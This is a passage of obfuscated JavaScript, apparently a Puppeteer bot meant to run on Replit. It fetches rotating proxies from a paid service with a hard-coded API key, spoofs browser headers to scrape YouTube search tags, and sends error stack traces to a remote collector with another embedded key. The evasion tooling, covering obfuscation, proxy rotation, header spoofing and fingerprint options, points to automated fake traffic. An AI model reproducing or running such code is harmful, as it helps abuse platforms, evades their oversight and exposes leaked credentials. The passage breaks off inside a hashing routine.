const aF = c,
  aE = d,
  aD = b;

function getRandomInt(f, g) {
  const h = ceil(f);
  return floor(random() * (floor(g) - h + (0x24f5 * 0x1 + -0xab * 0x3 + -0x22f3))) + h;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x246a + 0x54 + -0x120b * -0x2);
    let h = e[f];
    if (c['Pilpys'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0xc1b + -0x30 * -0x3f + 0xf * 0x5, r, s, t = 0x1fd0 * 0x1 + 0x11f7 * -0x1 + -0xdd9; s = m['charAt'](t++); ~s && (r = q % (-0x479 * -0x5 + 0x19c8 + -0x3021) ? r * (0x18a * 0x5 + -0x1 * -0x2032 + -0x27a4) + s : s, q++ % (0x25e4 * -0x1 + 0x1 * 0x187 + 0x2461)) ? o += String['fromCharCode'](-0x1557 + 0x45f * 0x7 + -0x843 & r >> (-(-0xb28 + -0x1 * -0xb99 + -0x6f) * q & -0x168d + -0x9de + 0x5 * 0x67d)) : -0x1cc1 + -0xc6 + -0x1d87 * -0x1) {
          s = n['indexOf'](s);
        }
        for (let u = -0x3d4 * 0x2 + -0x5ba + 0xd62 * 0x1, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x3 * -0x871 + -0x18b9 * 0x1 + 0x321c))['slice'](-(-0x1142 + 0x153a + 0x27 * -0x1a));
        }
        return decodeURIComponent(p);
      };
      c['fUcgxn'] = i, b = arguments, c['Pilpys'] = !![];
    }
    const j = e[-0x89f * 0x1 + -0x13 * -0xdf + -0x7ee],
      k = f + j,
      l = b[k];
    return !l ? (h = c['fUcgxn'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function randomWait() {
  return await wait(0x1 * -0x515 + 0x7b2 * 0x1 + 0x10eb + (0x75 * -0x3c + 0x794 * -0x5 + -0xb5 * -0x78) * random()), -0x1557 + 0x45f * 0x7 + -0x941;
}

function randomFlush(f, g) {
  const h = f['length'];
  let i = floor(random() * h),
    j = arrs['get'](g);
  for (j || (j = new Set(), arrs['set'](g, j)); j['has'](i);)
    i = floor(random() * h);
  return j['add'](i), j['size'] === h && j['clear'](), f[i];
}

function extractLinks(f) {
  const g = /<a\s+(?:[^>]*?\s+)?href="([^"]*)"/gi;
  let h, i = [];
  for (; null !== (h = g['exec'](f));)
    h['index'] === g['lastIndex'] && g['lastIndex']++, h['forEach']((j, k) => {
      -0xb28 + -0x1 * -0xb99 + -0x70 === k && i['push'](j);
    });
  return i;
}

function extractAnchorData(f) {
  const g = h => {
    const i = f['indexOf'](h + '=\x22');
    if (-(-0x168d + -0x9de + 0x5 * 0x67c) === i)
      return null;
    const j = i + h['length'] + (-0x1cc1 + -0xc6 + -0x1d89 * -0x1),
      k = f['indexOf']('\x22', j);
    return -(-0x3d4 * 0x2 + -0x5ba + 0xd63 * 0x1) === k ? null : f['substring'](j, k);
  };
  return {
    'pingUrl': g('data-ping-' + 'url'),
    'scriptId': g('data-scrip' + 't-id'),
    'ipAddress': g('data-ip-ad' + 'dress'),
    'pingKey': g('data-ping-' + 'key')
  };
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x246a + 0x54 + -0x120b * -0x2);
    let h = e[f];
    return h;
  }, d(b, c);
}

function a() {
  const cE = [
    'BZVdV0RcTvmssMRdHG',
    'W7/cISknW5b/bCkxWOOyWRu',
    'text',
    'W7DQjKTQdmkJy0/dSa',
    '6\x20Edg/108.',
    'WOeEW7bKW6hdRflcUq0u',
    'W5P5mwJdUwhdOweuWQG',
    'ztnKn2nIndy3oq',
    'pts/by-sit',
    'W57cVwviW7OyoGJdHW',
    'uq3cR8oBWO3dSmoNACoDvW',
    'w0nixsbdB3jLza',
    'f8o8d8o4xGecBG5z',
    'B20VCxvHzgvJyq',
    'jzuZuwF490',
    'with\x20argum',
    'BY8YmdeWmdeWmq',
    'easyfork.o',
    'WPpdSmkf',
    'Cache',
    'CMCVzw4VC2nYAq',
    'zw51C2vYANmUBW',
    'WQmEW43cV8ohW4/dMSoigSoe',
    'BwfW',
    'includes',
    'WPyDhSoTtJ7dSmkkWQXS',
    'Dgv4Dcz1Dg1FyW',
    'TNGGOgwPtc',
    'me:\x20',
    'xb3cUSoiW4ZcRSo7CmknfG'
  ];
  a = function() {
    return cE;
  };
  return a();
}
async function getSearchTerm() {
  const aB = c;
  return [
    ...(await fetch('https://ra' + 'pidtags.io' + '/api/gener' + 'ator?query' + '=' + _theAlphabet['random']() + ('&type=YouT' + 'ube'), {
      'credentials': 'omit',
      'headers': {
        'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '09.0)\x20Geck' + aB(0x10) + '\x20Firefox/1' + '16.0',
        'Accept': 'applicatio' + 'n/json',
        'Accept-Language': 'en-US,en;q' + '=0.5',
        'Prefer': 'safe',
        'Alt-Used': 'rapidtags.' + 'io',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origi' + 'n'
      },
      'referrer': 'https://ra' + 'pidtags.io' + '/generator',
      'method': 'GET',
      'mode': 'cors'
    })['then'](f => f['json']()))['tags'],
    'zyenith',
    'zyenith\x20mi' + 'necraft',
    'minecraft\x20' + 'zyenith',
    'moomoo.io',
    'moomoo.io\x20' + 'spyder',
    'mrbeast',
    'pewdiepie',
    'quadeca',
    'urban\x20resc' + 'ue\x20ranch'
  ]['random']();
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x246a + 0x54 + -0x120b * -0x2);
    let h = e[f];
    if (b['yHPMGO'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0xc1b + -0x30 * -0x3f + 0xf * 0x5, s, t, u = 0x1fd0 * 0x1 + 0x11f7 * -0x1 + -0xdd9; t = n['charAt'](u++); ~t && (s = r % (-0x479 * -0x5 + 0x19c8 + -0x3021) ? s * (0x18a * 0x5 + -0x1 * -0x2032 + -0x27a4) + t : t, r++ % (0x25e4 * -0x1 + 0x1 * 0x187 + 0x2461)) ? p += String['fromCharCode'](-0x1557 + 0x45f * 0x7 + -0x843 & s >> (-(-0xb28 + -0x1 * -0xb99 + -0x6f) * r & -0x168d + -0x9de + 0x5 * 0x67d)) : -0x1cc1 + -0xc6 + -0x1d87 * -0x1) {
          t = o['indexOf'](t);
        }
        for (let v = -0x3d4 * 0x2 + -0x5ba + 0xd62 * 0x1, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x3 * -0x871 + -0x18b9 * 0x1 + 0x321c))['slice'](-(-0x1142 + 0x153a + 0x27 * -0x1a));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x89f * 0x1 + -0x13 * -0xdf + -0x7ee,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x25c8 + -0xa82 + -0x2 * 0xda3; u < -0x1 * 0x12f5 + 0x70d + 0x674 * 0x2; u++) {
          p[u] = u;
        }
        for (u = -0x25 * 0x7a + 0x118c + 0x16; u < 0x3 * -0x7ed + 0x158e + 0x339; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x45b + -0x1f6a + 0x1c0f), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x1a6b * 0x1 + -0xfa3 + 0x2a0e, q = 0x885 + -0x28 * -0x25 + -0xe4d;
        for (let v = 0x112a * -0x1 + -0xec4 + 0x1fee; v < n['length']; v++) {
          u = (u + (0x47e * 0x4 + -0x1099 * 0x1 + 0xa * -0x23)) % (0x5ae + -0x205c + -0x93a * -0x3), q = (q + p[u]) % (0x581 * 0x6 + 0xab5 * 0x2 + -0x3570), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x21d3 + -0x11ef * -0x2 + -0x44b1)]);
        }
        return t;
      };
      b['sMyghE'] = m, c = arguments, b['yHPMGO'] = !![];
    }
    const j = e[0x13 * -0x13d + -0x39 * 0x65 + 0x2e04],
      k = f + j,
      l = c[k];
    return !l ? (b['swWxUS'] === undefined && (b['swWxUS'] = !![]), h = b['sMyghE'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}

function isValidProxy(f) {
  return 'string' == typeof f && f['length'] > 0x3 * -0x871 + -0x18b9 * 0x1 + 0x320f && f['includes'](':');
}
async function getRandomProxy() {
  for (;;) {
    const f = await fetch('https://st' + 'ratums.io/' + 'api/proxy/' + 'fetch?amt=' + '1&premium=' + 'yes&key=68' + 'dd383d6a62' + 'fb45684a02' + '1121959d15' + '06f8270066' + 'c62adc84aa' + 'a256e2b0e2' + '09')['then'](g => g['text']());
    if (isValidProxy(f))
      return f;
  }
}
const replUrl = 'https://' + process['env']['REPL_SLUG'] + '.' + process['env']['REPL_OWNER'] + '.repl.co',
  flags = {
    'ActivateBrowser': 0x1,
    'RPL2_MDM2': 0x1,
    'RPL2_RPRT': 0x1,
    'RPL2_YT': 0x1,
    'doOUJS': 0x1,
    'doGF': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1,
    'doUseProxy': 0x1
  },
  {
    ElementHandle: ElementHandle,
    Page: Page,
    Frame: Frame,
    Browser: Browser
  } = require('puppeteer'),
  Check = (f => {
    function g(k = '') {
      return new Error()['stack'] || new Error()['toString']();
    }
    async function h(...k) {
      const l = [
          '[CH]\x20Cored' + 'ump:',
          ...k
        ]['join']('\x0a'),
        m = g();
      await async function(n) {
        const p = '18f9a0a514' + '8022de3150' + 'b78d2ef231' + '00b85393e4' + '67e20d4e39' + 'f791cb',
          q = 'https://st' + 'ratums.io/' + 'api/errorc' + 'ollect';
        if (((() => {
            try {
              return !!globalThis['process']['exit'];
            } catch (u) {
              return -0x1142 + 0x153a + 0x7f * -0x8;
            }
          })())) {
          try {
            let u = require('axios');
            if (u)
              return void await u['post'](q, {
                'ekey': p,
                'message': n
              });
          } catch (v) {}
          try {
            let w = require('node-fetch');
            if (w)
              return void await w(q, {
                'method': 'POST',
                'body': JSON['stringify']({
                  'ekey': p,
                  'message': n
                }),
                'headers': {
                  'content-type': 'applicatio' + 'n/json'
                }
              });
          } catch (x) {}
          try {
            if (globalThis['fetch'])
              return void await globalThis['fetch'](q, {
                'method': 'POST',
                'body': JSON['stringify']({
                  'ekey': p,
                  'message': n
                }),
                'headers': {
                  'content-type': 'applicatio' + 'n/json'
                }
              });
          } catch (y) {}
        } else {
          try {
            if (globalThis['fetch'])
              return void await globalThis['fetch'](q, {
                'method': 'POST',
                'body': JSON['stringify']({
                  'ekey': p,
                  'message': n
                }),
                'headers': {
                  'content-type': 'applicatio' + 'n/json'
                }
              });
          } catch (z) {}
          try {
            if (globalThis['XMLHttpReq' + 'uest']) {
              const A = new globalThis['XMLHttpReq' + 'uest']();
              A['open']('POST', q), A['setRequest' + 'Header']('content-ty' + 'pe', 'applicatio' + 'n/json');
              let B = new Promise(C => {
                A['onload'] = () => C();
              });
              return A['send'](JSON['stringify']({
                'ekey': p,
                'message': n
              })), void await B;
            }
          } catch (C) {}
        }
      }(l + '\x0a' + m);
    }
    const i = Array['isArray'],
      j = {
        'info' (k) {
          h(k);
        },
        'dumpStackTrace': g,
        'cust': function(k, l) {
          try {
            l(k) || h('[CH]\x20Cored' + 'ump:', k, l);
          } catch (m) {
            h('[CH]\x20Cored' + 'ump:', k, l, m);
          }
        },
        'idn': function(k) {
          try {
            'object' == typeof k && k['_isIdentit' + 'yType'] || h('[CH]\x20Cored' + 'ump:', k);
          } catch (l) {
            h('[CH]\x20Cored' + 'ump:', k, l);
          }
        },
        'str': function(k) {
          try {
            'string' != typeof k && h('[CH]\x20Cored' + 'ump:', k);
          } catch (l) {
            h('[CH]\x20Cored' + 'ump:', k, l);
          }
        },
        'num': function(k) {
          try {
            'number' != typeof k && h('[CH]\x20Cored' + 'ump:', k);
          } catch (l) {
            h('[CH]\x20Cored' + 'ump:', k, l);
          }
        },
        'all': function(k, l) {
          try {
            k['some'](m => typeof m !== l) && h('[CH]\x20Cored' + 'ump:', k, l);
          } catch (m) {
            h('[CH]\x20Cored' + 'ump:', k, l, m);
          }
        },
        'type': function(k, l) {
          try {
            if (typeof k == typeof l)
              return;
            h('[CH]\x20Cored' + 'ump:', k, l);
          } catch (m) {
            h('[CH]\x20Cored' + 'ump:', k, l, m);
          }
        },
        'func': function(k) {
          try {
            'function' != typeof k && h('[CH]\x20Cored' + 'ump:', k);
          } catch (l) {
            h('[CH]\x20Cored' + 'ump:', k, l);
          }
        },
        'eq': function(k, l) {
          const aC = c;
          try {
            k !== l && h('[CH]\x20Cored' + 'ump:', k, l);
          } catch (m) {
            h(aC(0xb) + 'ump:', k, l, m);
          }
        },
        'iface': function(k, l) {
          try {
            const m = Object['keys'](l);
            for (let n of m)
              k['hasOwnProp' + 'erty'](n) || h('[CH]\x20Cored' + 'ump:', m, k, l, 'searched\x20f' + 'or:', n), typeof k[n] != typeof l[n] && h('[CH]\x20Cored' + 'ump:', m, k, l, 'searched\x20f' + 'or:', n);
          } catch (p) {
            h('[CH]\x20Cored' + 'ump:', k, l, p);
          }
        },
        'prop': function(k, l) {
          try {
            if (i(l)) {
              for (let m of l)
                j['prop'](k, m);
            }
            if (k['hasOwnProp' + 'erty'](l))
              return;
            h('[CH]\x20Cored' + 'ump:', k, l);
          } catch (n) {
            h('[CH]\x20Cored' + 'ump:', k, l, n);
          }
        },
        'inst': function(k, l) {
          try {
            if (k instanceof l)
              return;
            h('[CH]\x20Cored' + 'ump:', k, l);
          } catch (m) {
            h('[CH]\x20Cored' + 'ump:', k, l, m);
          }
        },
        'ia': function(k, ...l) {
          try {
            for (let m of l)
              if (k instanceof m)
                return;
            h('[CH]\x20Cored' + 'ump:', k, ...l);
          } catch (n) {
            h('[CH]\x20Cored' + 'ump:', k, ...l, n);
          }
        },
        'arr': function(k) {
          try {
            if (i(k))
              return;
            h('[CH]\x20Cored' + 'ump:', k);
          } catch (l) {
            h('[CH]\x20Cored' + 'ump:', k);
          }
        },
        'nes': function(k) {
          j['cust'](k, l => '' !== l), j['str'](k);
        },
        'bool': k => {
          try {
            if (-0x89f * 0x1 + -0x13 * -0xdf + -0x7ed == k)
              return;
            if (0x25c8 + -0xa82 + -0x2 * 0xda3 == k)
              return;
            h('[CH]\x20Cored' + 'ump:', k);
          } catch (l) {
            h('[CH]\x20Cored' + 'ump:', k, l);
          }
        },
        'truthy': k => {
          try {
            if (k)
              return;
            h('[CH]\x20Cored' + 'ump:', k);
          } catch (l) {
            h('[CH]\x20Cored' + 'ump:', k, l);
          }
        },
        'nones': k => {
          try {
            if ('string' == typeof k && '' !== k || null === k)
              return;
            h('[CH]\x20Cored' + 'ump:', k);
          } catch (l) {
            h('[CH]\x20Cored' + 'ump:', l, k);
          }
        }
      };
    return j;
  })(),
  sha1 = ((() => {
    var e, f, g, h, i, j, k, l, m = 'object' == typeof window ? window : {},
      n = !m['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
    n && (m = global), e = ('0123456789' + 'abcdef')['split'](''), f = [-(-0xb * 0xb4b4dd2 + 0x2e33c69c + 0x670448b5 * 0x2), -0x15a * 0x557f + 0x73004e + 0x808d58,
      0x8b * -0x11f + 0x8d40 + 0x8e95,
      0x45b + -0x1f6a + 0x1b8f
    ], g = [-0x1a6b * 0x1 + -0xfa3 + 0x2a26,
      0x885 + -0x28 * -0x25 + -0xe3d,
      0x112a * -0x1 + -0xec4 + 0x1ff6,
      0x47e * 0x4 + -0x1099 * 0x1 + 0xd * -0x1b
    ], h = [
      'hex',
      'array',
      'digest',
      'arrayBuffe' + 'r'
    ], i = [], j = function(q) {
      return function(r) {
        return new o(0x5ae + -0x205c + -0x129 * -0x17)['update'](r)[q]();
      };
    }, k = function() {
      var q, s, u = j('hex');
      for (n && (u = l(u)), u['create'] = function() {
          return new o();
        }, u['update'] = function(v) {
          return u['create']()['update'](v);
        }, q = 0x581 * 0x6 + 0xab5 * 0x2 + -0x3670; q < h['length']; ++q)
        s = h[q], u[s] = j(s);
      return u;
    }, l = function(q) {
      var r = eval('require(\'crypto\');'),
        s = eval('require(\'buffer\')[\'Buffer\'];'),
        t = function(u) {
          if ('string' == typeof u)
            return r['createHash']('sha1')['update'](u, 'utf8')['digest']('hex');
          if (u['constructo' + 'r'] === ArrayBuffer)
            u = new Uint8Array(u);
          else {
            if (void(0x21d3 + -0x11ef * -0x2 + -0x45b1) === u['length'])
              return q(u);
          }
          return r['createHash']('sha1')['update'](new s(u))['digest']('hex');
        };
      return t;
    };
    class o {
      constructor(q) {
          q ? (i[0x13 * -0x13d + -0x39 * 0x65 + 0x2e04] = i[-0xd * -0xfe + 0x1341 * 0x1 + -0x2017] = i[0x1 * -0xfa1 + 0x186c + -0x19 * 0x5a] = i[0x15cb * 0x1 + -0x136 + -0x1493] = i[0x1d50 + 0x5 * 0x18a + -0x24ff] = i[0x6f3 + -0x1447 * 0x1 + 0x1c * 0x7a] = i[-0x1 * 0x2205 + 0x3 * -0x403 + 0x2e13] = i[0x64b + 0x2309 + -0x294e] = i[0x5c * 0x62 + 0xb * 0xc5 + 0x2c * -0xfe] = i[0x1 * 0x1606 + 0x1f * 0x5d + 0x1 * -0x2141] = i[0xb0 * 0x25 + -0x1369 * 0x1 + -0x5fe] = i[0xa99 * -0x1 + -0x2018 + -0x1 * -0x2abb] = i[-0x228 + -0xc35 * 0x3 + -0x26d2 * -0x1] = i[-0x22e1 + -0x1 * -0x26ce + -0x3 * 0x14b] = i[-0xe5 * -0x2 + -0x24a + 0x8d] = i[-0xc92 * -0x3 + 0x28 * 0xf8 + -0x3d2 * 0x14] = i[-0x21c5 + -0x19e9 + 0x3bbd * 0x1] = -0x24 * 0x2e + -0x1 * -0x2591 + -0x1f19, this['blocks'] = i) : this['blocks'] = [
            0xf12 + 0x266 + -0x1178, -0xd * 0x137 + -0x11f * -0x3 + 0xc6e, -0x1559 * -0x1 + -0xc7f * -0x3 + 0x1d6b * -0x2,
            0xb + -0x1962 * 0x1 + 0x1957,
            0xea7 + 0x14a7 + -0x234e, -0xc1a + -0x6 * -0x156 + 0x416,
            0x2132 + -0x1 * 0x391 + 0x29 * -0xb9,
            0x24be + 0x888 + -0x2d46,
            0x26e8 + 0x8d * 0x5 + -0x29a9, -0xef * -0x16 + 0x28 * 0x3b + 0xd * -0x24a,
            0x1 * -0x403 + -0x23d2 * 0x1 + 0x135 * 0x21,
            0x1 * 0xe7d + -0x26b7 + 0x183a, -0x592 + 0x1 * 0x201d + -0x1a8b, -0xe7 * 0x2a + -0x1 * 0x1540 + -0x43 * -0xe2, -0x1 * 0x1b32 + -0x1 * -0x1b59 + 0xd * -0x3,
            0x1 * 0x709 + 0x2307 + -0x2a10,
            0x25ee + 0x2047 + -0x4635
          ], this['h0'] = -0xe979419 * 0x3 + -0x64a968e7 + 0xf7b54833, this['h1'] = 0x7b1a179b + 0x1c486157e + -0x1 * 0x14fd28190, this['h2'] = -0x50cc7f5 * -0x11 + 0x4b7bc8c3 + -0x89a330a, this['h3'] = -0x32c5ad7 * -0x1 + -0x7c3a99 * 0x3 + 0xe7aa96a, this['h4'] = -0x2be8da4 * 0x89 + -0x1 * -0x8087bbc0 + -0x1bb44f2f4 * -0x1, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x1405 + 0x24e6 + -0x653 * 0x9, this['finalized'] = this['hashed'] = -0x2 * 0x6a0 + -0x1d4e + -0x2a8e * -0x1, this['first'] = 0x47 * 0x2f + -0x1456 + -0x176 * -0x5;
        }
        ['update'](q) {
          var u, v, w, x, y, z;
          if (!this['finalized']) {
            for ((u = 'string' != typeof q) && q['constructo' + 'r'] === m['ArrayBuffe' + 'r'] && (q = new Uint8Array(q)), w = -0x79 * -0x29 + -0x1dfb + 0x1 * 0xa9a, y = q['length'] || -0x12b0 + -0x37d * 0x7 + 0x2b1b, z = this['blocks']; w < y;) {
              if (this['hashed'] && (this['hashed'] = 0x1 * -0x11a1 + 0x1f4f + -0xce * 0x11, z[0x4cf + -0x1 * 0x641 + -0x172 * -0x1] = this['block'], z[-0x250f + 0x727 + 0x1df8] = z[0xb * 0x76 + 0x1849 + -0x1d5a] = z[-0x1 * -0x1733 + -0x11de + -0x1 * 0x553] = z[-0x12d0 + 0x1fb9 + -0xce6] = z[-0x262d + -0x1 * 0x19be + 0x1 * 0x3fef] = z[0x1db2 + 0x51 * 0x67 + -0x3e44] = z[-0x18d8 + -0x4 * 0x182 + 0x1ee6] = z[-0x21e5 * 0x1 + -0x3c8 * -0x6 + -0x59e * -0x2] = z[0x6 * -0x22 + 0x18 * -0x18e + -0x989 * -0x4] = z[-0x22d * -0x1 + -0xf9a + 0xd76] = z[0x1ee9 + -0x1762 + -0x77d] = z[-0x1fdb * -0x1 + -0x179 * 0x7 + 0xf * -0x16f] = z[0x2 * -0xa1d + 0xeaf + 0x597 * 0x1] = z[0xa19 + -0x250c + 0x1b00] = z[-0x54f + -0x2cf + 0x416 * 0x2] = z[0x1d63 * -0x1 + 0x73e + -0x1c * -0xcb] = 0x293 * 0xe + 0xd3b + 0x3145 * -0x1), u) {
                for (x = this['start']; w < y && x < -0x19f9 * 0x1 + 0xd6a + 0xccf; ++w)
                  z[x >> -0x489 * -0x1 + 0x6d * 0x4e + -0x25bd] |= q[w] << g[0x2211 + -0x1 * 0x2471 + -0x2f * -0xd & x++];
              } else {
                for (x = this['start']; w < y && x < 0x120f + 0x1676 + -0x2845; ++w)
                  (v = q['charCodeAt'](w)) < 0xb * 0xdb + -0x63e * -0x1 + -0xf27 * 0x1 ? z[x >> 0x16ab + -0x4ba + -0x11ef] |= v << g[-0x3e3 + -0x1a47 + 0x1e2d & x++] : v < -0x1 * 0xfda + 0x1f * 0x97 + 0x591 ? (z[x >> -0xda4 * 0x2 + -0xbe4 + 0x272e * 0x1] |= (-0xd5 * -0x2b + -0x1e7b + -0x48c | v >> -0x12e5 + -0x12bf + 0x25aa) << g[0x244d + -0xff3 + -0x1457 * 0x1 & x++], z[x >> 0x120b + -0x3ca + 0xe3f * -0x1] |= (0x76 * -0x9 + 0x19f5 + 0x443 * -0x5 | 0x1998 + -0x74b + -0x120e & v) << g[0x575 * -0x3 + 0x12c1 + -0x25f & x++]) : v < -0x7d6e + -0x3b52 * 0x4 + 0x242b6 || v >= -0x6 * 0x196d + -0x2 * -0x1e38 + 0x13c1e ? (z[x >> 0x1429 + 0x5 * -0x4be + 0x1 * 0x38f] |= (0xde9 + 0xda0 + 0xc3 * -0x23 | v >> -0x1b05 + -0x134c + 0x2e5d) << g[-0xf29 * -0x2 + -0x1 * -0x20e9 + -0x908 * 0x7 & x++], z[x >> -0x4d3 + -0x2b * 0xae + -0x1 * -0x220f] |= (-0xdd3 + -0x1 * -0x20e3 + -0x4a4 * 0x4 | v >> -0xec5 + -0x1de + 0x10a9 & -0x1cc4 + 0x2183 + 0x60 * -0xc) << g[0x112f + 0x16ac + -0x78 * 0x55 & x++], z[x >> 0x3 * -0xbf + -0x2072 + 0x22b1] |= (0x833 * -0x1 + -0x1b35 + 0x23e8 | -0xbe0 + -0xf74 + 0x1b93 & v) << g[-0x13 * -0x1a + 0x1 * -0x707 + 0x51c & x++]) : (v = -0x560e + -0x2 * -0x4d27 + 0xbbc0 + ((-0x21a4 + -0x24e9 + 0x4a8c & v) << -0x10 * 0x1c4 + -0x172b + -0x3 * -0x1127 | 0xeb9 * -0x1 + -0x19ee + 0x2ca6 & q['charCodeAt'](++w)), z[x >> 0x91 * 0x2a + 0x913 + -0xd * 0x287] |= (0x1fbb + -0x123f * 0x1 + -0xc8c | v >> 0x13ce + -0x6a * 0x4b + -0x142 * -0x9) << g[0x1d * -0x2d + -0x176f + 0x1c8b & x++], z[x >> -0x76a * -0x5 + 0x1a12 + -0x3f22] |= (0x2e9 + -0x853 * 0x1 + 0x2 * 0x2f5 | v >> -0xbb0 + -0xc47 * -0x1 + -0x8b & 0x2 * -0xbaa + 0x3d * 0x83 + -0x7a4) << g[0xc10 + -0x11b * 0x8 + -0x1 * 0x335 & x++], z[x >> -0x26b5 + -0x3a * -0x6 + -0x255b * -0x1] |= (-0x1082 + -0x233 * 0x5 + 0x1c01 | v >> 0x24dd + -0x9f3 * -0x1 + -0x1 * 0x2eca & 0x19 * -0x129 + -0x81 * 0x17 + 0x28d7) << g[-0x2 * 0x348 + 0x91 * 0x40 + -0x1dad & x++], z[x >> 0xbb6 + -0x90a * 0x2 + -0x110 * -0x6] |= (0x77b + 0x1af * -0x16 + 0x1e0f | -0x11 * 0x35 + -0x439 + -0x7fd * -0x1 & v) << g[-0x5e * 0x2 + 0x3 * -0x58 + 0x5b * 0x5 & x++]);
              }
              this['lastByteIn' + 'dex'] = x, this['bytes'] += x - this['start'], x >= -0x322 * -0x3 + 0x24a7 * 0x1 + -0x2dcd ? (this['block'] = z[-0xde9 * 0x1 + -0x2032 + 0x2e2b], this['start'] = x - (-0x20f1 + 0x121e + 0xf13), this['hash'](), this['hashed'] = -0x10e2 * -0x2 + 0x6bf + -0x2882) : this['start'] = x;
            }
            return this['bytes'] > 0x6e20 * -0x16cb7 + 0x99c06dfc + 0x10323cae3 && (this['hBytes'] += this['bytes'] / (-0x745 * -0x216ebc + -0x1eed2c24c + 0x2544c1 * 0xda0) << -0x521 + 0xc * 0x21e + -0x1447, this['bytes'] = this['bytes'] % (0x143a876d8 + 0x1559383b0 + -0x1993bfa88)), this;
          }
        }
        ['finalize']() {
          if (!this['finalized']) {
            this['finalized'] = 0x962 + 0x23bf + -0x1690 * 0x2;
            var q = this['blocks'],
              r = this['lastByteIn' + 'dex'];
            q[-0x3ed + -0x1 * 0x221b + 0x5c * 0x6a] = this['block'], q[r >> -0x1 * -0x1e4f + -0x1 * -0x4ff + -0x234c] |= f[0x1b9 * 0xf + 0x9ba + -0x11c7 * 0x2 & r], this['block'] = q[-0x1a00 + 0x1d0e + -0x2fe], r >= -0xd * -0xbb + 0x1f57 + -0x6 * 0x6c5 && (this['hashed'] || this['hash'](), q[0x1 * -0x701 + -0x4 * -0x740 + -0x1 * 0x15ff] = this['block'], q[-0xca7 * -0x3 + 0x10 * -0x5c + -0x2025] = q[0x3f7 + 0x7f3 + -0xbe9] = q[0x22f * -0x2 + -0x2584 + -0x2 * -0x14f2] = q[-0x86a * 0x3 + 0x127b + 0x11 * 0x66] = q[0x24c1 + 0x500 + -0x29bd] = q[0x37 * 0x6d + 0x384 + -0x1aea] = q[-0x815 * -0x3 + 0x23fe + -0x1 * 0x3c37] = q[-0x1 * -0x886 + -0xe6 + -0x799] = q[-0x3 * -0xafc + 0x164d + 0x1 * -0x3739] = q[0xe7 * -0x1d + -0x17fb + 0x322f] = q[-0xeb + -0x12fb + 0x13f0] = q[-0x209e + 0x1 * 0x1e23 + 0x286] = q[0x3fc + -0xb68 + 0x778] = q[-0xa * 0x3a9 + -0x37f * 0x1 + 0x2826] = q[-0x264 + 0x26e2 + -0x2470] = q[0x8cd + -0x77 * -0x3d + -0x2519] = -0x1e95 * -0x1 + -0x19b1 + -0x4e4), q[0x24f2 * -0x1 + 0x5 * -0x4b + 0x2677] = this['hBytes'] << 0x175b + -0x1e65 * 0x1 + 0x169 * 0x5 | this['bytes'] >>> 0x3be + -0x28f + -0x112, q[-0xd * 0x1c7 + -0x217c + 0x1c53 * 0x2] = this['bytes'] << -0x1 * 0x74d + -0x1 * 0x622 + 0xd72, this['hash']();
          }
        }
        ['hash']() {
          var q, u, v = this['h0'],
            w = this['h1'],
            x = this['h2'],
            y = this['h3'],
            z = this['h4'],
            A = this['blocks'];
          for (q = 0x1f59 + 0x708 + 0x241 * -0x11; q < -0xd63 * -0x1 + 0x1b70 + -0x2883; ++q)
            u = A[q - (-0x2022 + 0x27d * 0xa + -0x8f * -0xd)] ^ A[q - (0xb52 + -0x61e + 0x1 * -0x52c)] ^ A[q - (0x2e6 * -0x1 + -0x3e2 * -0x7 + 0xc1d * -0x2)] ^ A[q - (0x1ae9 * -0x1 + -0x2221 + -0x58e * -0xb)], A[q] = u << 0x16ba + -0x8a + -0x162f | u >>> -0x3 * 0xb55 + 0x86 * -0xb + 0x27e0;
          for (q = -0x6b2 * 0x1 + -0x1968 + 0x24b * 0xe; q < 0xbc7 + 0x2554 + -0x3107; q += 0x34b * 0x8 + 0xffa * 0x2 + 0x3a47 * -0x1)
